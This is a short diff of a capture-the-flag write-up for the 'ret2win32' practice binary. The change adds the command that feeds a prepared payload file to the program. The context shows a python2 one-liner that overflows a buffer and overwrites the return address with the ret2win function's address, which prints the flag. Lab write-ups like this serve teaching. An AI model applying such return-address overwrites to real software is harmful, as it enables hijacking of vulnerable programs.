@@ -62,6 +62,9 @@ So `0x0804862c` is the address of `ret2win`. I'll now use the gathered informati
 ```bash
 python2 -c 'print "\x00"*44 + "\x2c\x86\x04\x08"' > payload.txt
 ```
-Now to throw the exploit:
+Now to throw the exploit with:
+```bash
+./ret2win32 < payload.txt
+```
 ![[Pasted image 20231215171642.png]]
 As shown in the above picture, the exploit was successful, and the program executed the `ret2win` function which prints the "flag".
